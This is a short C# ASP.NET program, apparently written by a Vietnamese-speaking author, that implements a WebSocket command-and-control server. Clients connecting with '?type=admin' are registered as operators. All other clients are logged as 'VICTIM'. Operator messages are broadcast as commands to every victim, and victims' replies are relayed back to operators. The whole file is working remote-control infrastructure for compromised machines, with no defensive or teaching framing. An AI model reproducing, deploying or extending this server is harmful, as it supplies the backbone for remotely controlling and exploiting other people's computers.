using System.Net.WebSockets;
using System.Text;
using System.Collections.Concurrent;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.UseWebSockets();

// QUẢN LÝ KẾT NỐI
var _adminClients = new ConcurrentDictionary<string, WebSocket>();
var _targetClients = new ConcurrentDictionary<string, WebSocket>();

app.Map("/ws", async context =>
{
    if (!context.WebSockets.IsWebSocketRequest)
    {
        context.Response.StatusCode = 400;
        return;
    }

    // Phân loại Client dựa trên URL ?type=admin
    bool isAdmin = context.Request.Query["type"] == "admin";
    
    using var socket = await context.WebSockets.AcceptWebSocketAsync();
    var clientId = Guid.NewGuid().ToString();

    if (isAdmin)
    {
        _adminClients.TryAdd(clientId, socket);
        Console.WriteLine($"😎 ADMIN Connected: {clientId}");
    }
    else
    {
        _targetClients.TryAdd(clientId, socket);
        Console.WriteLine($"✅ VICTIM Connected: {clientId}");
    }

    var buffer = new byte[4096];
    try
    {
        while (socket.State == WebSocketState.Open)
        {
            var result = await socket.ReceiveAsync(buffer, CancellationToken.None);
            if (result.MessageType == WebSocketMessageType.Close) break;

            var message = Encoding.UTF8.GetString(buffer, 0, result.Count);

            if (isAdmin)
            {
                Console.WriteLine($"[Admin ra lệnh]: {message}");
                // Gửi lệnh cho TẤT CẢ Victim
                foreach (var victim in _targetClients.Values)
                {
                    if (victim.State == WebSocketState.Open)
                        await victim.SendAsync(Encoding.UTF8.GetBytes(message), WebSocketMessageType.Text, true, CancellationToken.None);
                }
            }
            else
            {
                Console.WriteLine($"[Victim phản hồi]: {message}");
                // Gửi phản hồi cho TẤT CẢ Admin
                foreach (var admin in _adminClients.Values)
                {
                    if (admin.State == WebSocketState.Open)
                        await admin.SendAsync(Encoding.UTF8.GetBytes($"[{clientId}]: {message}"), WebSocketMessageType.Text, true, CancellationToken.None);
                }
            }
        }
    }
    catch (Exception ex) { Console.WriteLine("Lỗi: " + ex.Message); }
    finally
    {
        if (isAdmin) _adminClients.TryRemove(clientId, out _);
        else _targetClients.TryRemove(clientId, out _);
        Console.WriteLine($"❌ Disconnected: {clientId}");
    }
});




app.Run("http://0.0.0.0:8080");